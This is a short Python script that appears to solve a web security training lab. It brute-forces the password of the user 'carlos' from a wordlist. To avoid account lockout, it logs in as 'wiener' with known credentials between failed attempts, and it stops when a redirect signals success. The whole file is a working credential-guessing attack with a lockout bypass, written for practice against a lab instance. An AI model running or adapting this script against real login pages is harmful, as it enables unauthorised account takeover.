import requests

site = 'https://0a1c004203d49dff801f9e3200e000e3.web-security-academy.net'
login_url = f'{site}/login'
username = 'carlos'

s = requests.Session()

# Reset lockout counter by logging in as wiener
def login_wiener():
    data = {
        'username': 'wiener',
        'password': 'peter'
    }
    wiener_resp = s.post(login_url, data=data)
    print(f'[wiener login] Status Code: {wiener_resp.status_code}')

# Load password list
with open('auth-lab-passwords.txt', 'r') as f:
    passwords = [line.strip() for line in f]

for pw in passwords:
    print(f'Trying password: {pw}', end='')

    data = {
        'username': username,
        'password': pw
    }

    try:
        resp = s.post(login_url, data=data, allow_redirects=False, timeout=10)
        print(f' - Status Code: {resp.status_code}')
    except Exception as e:
        print(f'\n[!] Error trying {pw}: {e}')
        continue

    if resp.status_code == 302:
        print(f'[+] SUCCESS! carlos password is: {pw}')
        break

    # Reset lockout via wiener login
    login_wiener()
